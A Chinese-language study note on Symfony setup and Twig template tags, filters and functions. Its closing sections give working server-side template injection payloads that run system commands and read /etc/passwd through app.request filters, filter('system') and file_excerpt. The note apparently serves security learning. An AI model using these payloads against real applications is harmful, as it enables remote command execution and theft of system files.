Symfony

安装

wget https://get.symfony.com/cli/installer 
bash installer

创建项目

使用composer

composer create-project symfony/website-skeleton projectname

感觉还是直接symfony来的方便一点

symfony new --full project

检查安全漏洞

symfony check:security

运行程序

好像有坑，需要非root用户运行，还有一系列权限

symfony server:start

创建Controller

php bin/console make:controller HomeController

有一个注释路由

安装

composer require annotations

如果是用 symfony new --full project就已经安装了

用法：

class MainController extends AbstractController
{
    /**
     * @Route("/subscribe", name="subscribe")
     */
 public function subscribe(){}
}

查看路由

 php bin/console debug:router

symfony App 全局变量

app全局变量会自动注入全部twig模板

app.user

当前用户的对象

app.request

当前的请求数据

所有的方法直接去源代码看

https://github.com/symfony/symfony/blob/5.0/src/Symfony/Component/HttpFoundation/Request.php

列举几个常用的方法

  • app.request.get(key)

获取post的变量

  • getSession

获取session

{{ app.request.getSession()|join('')}}
  • app.request.getUser()

获取用户

  • app.request.getPassword()

获取header头PHP_AUTH_PW身份验证密码

app.session

关于session

几个方法

  • app.session.all

获取全部

  • app.session.get

    app.session.get('xxx')

  • app.session.set

设置session

app.session.set('key','value')

app.environment

配置环境

app.debug

如果开启了 debug，就是true

app.token

暂时略

关于 app.request 的进一步学习

在vendor/symfony/http-foundation/Request.php

一个一个跟进

request

是POST请求的内容

有

  • all()
  • keys()
  • replace()
  • add()
  • get()
  • set()
  • has()
  • remove()
  • filter()

query 和request对应是GET

其中的方法和 request是一样的

?a=1
1hh={{app.request.query.all()|join('')}}

  • req.request.attributes

  • req.request.cookies

Twig 模板渲染简单学习

tag

for

{% for i in 0..10%}
1
{%endfor%}

if

{% if 1==1 %}1{%endif%}

include

{% include 'twigi/inc.twig' %}
包含多个
{% include ['1.html', '2.html'] %}

如果有字数限制应该可以考虑include

只能是 templates目录下的

sandbox

启动熟悉的sandbox模式

{% sandbox %}
{% include '1.html' %}
{% endsandbox %}

set

{% set foo = 'bar' %}

filter 重要的来了

convert_encoding

从编码字符串转换到另外一种编码

{{ 'a'|convert_encoding('UTF-8', 'utf-16be') }}

escape转义

{{'da"'|escape}}

为了方便用e作为别名

可以escape多种格式

  • html默认

    {{'da"'|e('html')}} 
da&quot;

  • js

    {{'da"'|e('js')}}
da\u0022

  • css

{{'da"'|e('css')}}
da\22
  • url
{{'da"'|e('url')}}
da%22
  • 还有个html_attr

转义HTML属性字符串

filter

选择元素

{{[1,2,3,4,5,6,7]|filter(i=>i>2)|join('')}}
3,4,5,6,7

first

返回第一个数组，{},字符串 的内容

{{ [1, 2, 3, 4]|first }} \\1
{{ { a: 1, b: 2, c: 3, d: 4 }|first }} \\1
{{ '1234'|first }} \\1

last 和first对应

format 占位符号

{{'南梦师傅 %s'|format('tql')}}
南梦师傅 tql

join 拼接成字符串

{{ [1, 2, 3]|join }}
123

json_encode 就是使用这个函数

{{ {a:1}|json_encode()}}
{&quot;a&quot;:1}

{{ 123|json_encode()}}
123

keys 获取数组的键名

{{ {a:1,b:2,c:3}|keys|join(',') }}
a,b,c

{{ [1,2,3,4]|keys|join(',') }}
0,1,2,3

length

{{ 'das'|length}} //3

lower 和 upper

{{ 'das'|lower}}
{{ 'das'|upper}}

map

就是数组内的映射的筛选

{{[{a:1,b:2},{a:3,b:4}]|map(i=> "#{i.a}")|join('') }}

得到 13

"{i.a}" 这个引号需要是 双引号

merge 和php的一样

数组合并

{{ [1,2]|merge([3,4])|join(',')}}
1,2,3,4

replace

{{"abcdef "|replace({'a':'first','e':'haha'})}}
firstbcdhahaf

reverse

{{"abcdef "|reverse}}
fedcba

slice 切片

{{'123'|slice(1,2)}} //23
{{'123'[1:2]}} //23

split

{{ '1,2,3'|split(',') }}

striptags 去除标签

{{'asd'|striptags}} //asd

trim

略

url_encode

{{'asd'|url_encode}}
%3Casd%3Easd

function

attribute 访问object方法

还可以设置第三个参数，传递的变量

可以访问 object的属性

获取http请求

{{attribute(app,'request')}}

获取session

{{ attribute(app,'session')|join('')}}

当前程序环境的名称

{{ attribute(app,'environment')}} //dev

还有其他的方法，只是举个例子

include

包含模板渲染的内容

可以传递变量

{{ include('template.html', {foo: 'bar'}) }}

range

就是python那个

source

twig 读取模板的内容 限定在 templates

{{ source('twigi/index.html.twig')}}

twig 和symfony

render

第一个是路由，可以模板渲染
{{ render('twig2hhh') }}
{{ render('twig2hhh', options = []) }}

csrf_token 生成csrf token

{{csrf_token('asd')}}

humanize 人好看的形式

{{'adas'|humanize}} // Adas

file_excerpt 读取文件

{{ '/etc/passwd'|file_excerpt(1, -1) }}

第一个参数是line

第二个参数是在给定行数周围显示多少行

-1代表全部

format_file

这个很迷似乎生成一个标签，然后点击就can not open

懒得管了，占个位，用到再说

file_link

生成一个链接，还是can not open ，继续占个位置

{{ '/tmp/111'|file_link(1) }}
http://127.0.0.1:8000/_profiler/open?file=/tmp/111&amp;line=1#line1

命令执行


注入
{{app.request.query.filter(0,0,1024,{'options':'system'})}}
并且 GET 
?0=cat /etc/passwd

或者

这个我试过报错了

{{['cat${IFS}/etc/passwd']|filter('system')}}

因为是数组，所以报错，所以应该拼接

所以正确的应该是

{{['cat${IFS}/etc/passwd']|filter('system')|join('')}}

任意文件读取

{{'/etc/passwd'|file_excerpt(1,30)}}

{{'/etc/passwd'|file_excerpt(0,-1)}}

或者

{{app.request.files.get('file').__construct('/etc/passwd','')}}
{{app.request.files.get('file').openFile.fread(99)}}
